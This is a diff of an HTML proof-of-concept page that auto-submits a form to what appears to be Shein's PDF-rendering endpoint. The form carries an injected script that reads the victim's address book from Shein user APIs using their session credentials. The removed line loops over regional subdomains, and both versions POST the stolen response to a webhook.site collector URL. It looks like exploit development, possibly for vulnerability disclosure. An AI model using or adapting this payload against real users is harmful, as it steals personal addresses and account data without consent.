@@ -2,7 +2,7 @@
 <html>
 <body>
 <form id="f" action="https://pdf.shein.com/html" method="POST">
-<input name="content" value='<script>var regions=["eur","us","de","fr","es","it","ca","au","ar","br","cl","co","il","ma","mx","pl","pt","ro","se","za"];var i=0;function tryNext(){if(i>=regions.length)return;var x=new XMLHttpRequest();x.open("GET","https://"+regions[i]+".shein.com/bff-api/user-api/addressbook/address_book/get?_ver=1.1.8&_lang=en");x.withCredentials=true;x.onload=function(){if(x.responseText.indexOf('"ok"')>-1){var y=new XMLHttpRequest();y.open("POST","https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f");y.send(x.responseText);}else{i++;tryNext();}};x.send();}tryNext();</script>'>
+<input name="content" value='<script>var x=new XMLHttpRequest();x.open("GET","https://eur.shein.com/bff-api/user-api/addressbook/address_book/get?_ver=1.1.8&_lang=en");x.withCredentials=true;x.onload=function(){var y=new XMLHttpRequest();y.open("POST","https://webhook.site/afa8e098-cdf4-4c25-8230-2abe0bddd66f");y.send(x.responseText)};x.send()</script>'>
 </form>
 <script>document.getElementById("f").submit();</script>
 </body>
